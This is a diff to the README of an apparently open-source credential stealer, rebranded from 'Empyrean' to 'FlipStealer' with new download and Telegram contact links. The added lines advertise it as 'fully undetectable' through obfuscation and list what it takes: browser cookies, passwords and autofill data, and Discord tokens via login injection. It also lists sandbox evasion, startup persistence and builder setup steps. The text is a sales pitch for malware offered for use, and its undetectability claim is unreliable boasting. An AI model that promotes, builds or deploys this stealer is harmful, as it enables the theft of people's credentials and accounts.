@@ -10,11 +10,24 @@
     <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
     <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
     <br>
-    Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/forrrrrrrrr">Telegram</a>
+    Contact me: <a href="https://t.me/ChatGPT0909">Telegram</a>
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
 ## Features
+
+-   FUD (Fully Undetectable)
+    -   High level of obfuscation for python source code
+    -   No antivirus can possibly detect, not before infection nor after scanning
+    -   Only possible detection can be that the .exe file is not popular or official, also some antivirus might just flag with reason that it's source code is obfuscated and cannot be detected
+ 
+-   Browser data
+    -   Cookies
+    -   Passwords
+    -   History
+    -   Bookmarks
+    -   Autofill
+    -   Chrome, Edge, Brave, Opera GX, and many more...
 
 -   Discord token info
     -   Nitro
@@ -25,15 +38,10 @@
     -   HQ Guilds
     -   HQ Friends
     -   Gift codes
--   Browser data
-    -   Cookies
-    -   Passwords
-    -   History
-    -   Bookmarks
-    -   Autofill
-    -   Chrome, Edge, Brave, Opera GX, and many more...
+
 -   Discord injection
     -   Send token, password, and email on login or when password is changed
+
 -   System info
     -   User
     -   System
@@ -41,8 +49,8 @@
     -   Network
     -   WiFi
     -   Screenshot
--   Anti-debug
 
+-   Anti-debug
     -   Check if being run in a virustotal sandbox
 
 -   Startup persistence
@@ -59,7 +67,7 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/ChatGPT0909/FlipStealer/archive/refs/heads/main.zip)
 2. Extract zip
 3. Run `install_python.bat` if you don't have python installed
 4. Run the builder by double clicking the `build.bat` file
@@ -80,11 +88,11 @@ View the [contributing guidelines](CONTRIBUTING.md) for more information on how 
 
 ## License
 
-Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+FlipStealer is licensed under the <a href="https://mit-license.org/">MIT License</a>.
 
 ## Errors?
 
--   Make an [issue](https://github.com/addi00000/empyrean/issues)
--   Join the [Discord](https://discord.gg/GudVbfd9ZU)
+-   Make an [issue](https://github.com/ChatGPT0909/FlipStealer/issues)
+-   Contact me [Discord](https://t.me/ChatGPT0909)
 
 <img src="img/footer.png">
